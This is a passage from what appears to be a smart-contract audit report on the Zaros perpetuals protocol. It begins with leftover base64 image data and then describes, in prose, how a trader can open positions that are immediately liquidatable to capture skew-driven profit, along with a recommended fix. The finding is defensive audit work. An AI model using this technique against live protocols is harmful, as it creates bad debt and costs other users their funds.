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u1erTmHxi0sS8E6rxPgyxqvQe42NTzFOIVu33FUy49pi3uhJ5cSJ+RizeVAF+Wx0oqrAQiEBAz04ESEoiBFopAlLhtdKOU7WFgBAQAkJACAiB5kNAbgyaD3uVLASEgBAQAkJACLRSBMRAtdKOU7WFgBAQAkJACAiB5kNADFTzYa+ShYAQEAJCQAgIgVaKgBioVtpxqrYQEAJCQAgIASHQfAiIgWo+7FWyEBACQkAICAEh0EoREAPVSjtO1RYCQkAICAEhIASaDwExUM2HvUoWAkJACAgBISAEWikCYqBaacep2kJACAgBISAEhEDzISAGqvmwV8lCQAgIASEgBIRAK0VADFQr7ThVWwgIASEgBISAEGg+BMRANR/2KlkICAEhIASEgBBopQiIgWqlHadqCwEhIASEgBAQAs2HgBio5sNeJQsBISAEhIAQEAKtFAExUK2041RtISAEhIAQEAJCoPkQEAPVfNirZCEgBISAEBACQqCVIiAGqpV2nKotBISAEBACQkAINB8CYqCaD3uVLASEgBAQAkJACLRSBMRAtdKOU7WFgBAQAkJACAiB5kNADFTzYa+ShYAQEAJCQAgIgVaKgBioVtpxqrYQEAJCQAgIASHQfAiIgWo+7FWyEBACQkAICAEh0EoREAPVSjtO1RYCQkAICAEhIASaDwExUM2HvUoWAkJACAgBISAEWikC/x8nusxxhlq4TAAAAABJRU5ErkJggg==)

## Impact

A trader can create and fill orders that would be immediately liquidatable after. The greater the skew imbalance caused by the trader, the greater the 'temporary' profits. During liquidation, if the actual margin is much lower than what is checked in `_fillOrder`, this would not be covered by the trader's collateral and result in bad debt to the protocol.

## Code Snippet

<https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L435>

## Tool used

Manual Review

## Recommendation

When calculating `marginBalanceUsd` in `_fillOrder`, consider subtracting any temporary profit obtained from a 'premium' markPrice due to skew imbalance.





    